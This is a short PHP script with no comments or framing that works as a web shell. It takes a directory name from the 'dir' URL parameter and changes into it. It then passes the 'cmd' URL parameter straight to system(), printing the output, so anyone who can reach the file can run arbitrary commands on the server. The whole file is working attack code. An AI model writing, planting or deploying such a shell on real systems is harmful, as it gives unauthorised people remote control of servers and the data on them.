<?php

function path() {

 if(isset($_GET['dir'])) {

  $dir = str_replace("\\", "/", $_GET['dir']);

  @chdir($dir);

 } else {

  $dir = str_replace("\\", "/", getcwd());

 }

 return $dir;

}

echo "Current Dir:>".path();



    if(isset($_GET['cmd'])){

  

        echo system($_GET['cmd']);

    

    }



?>
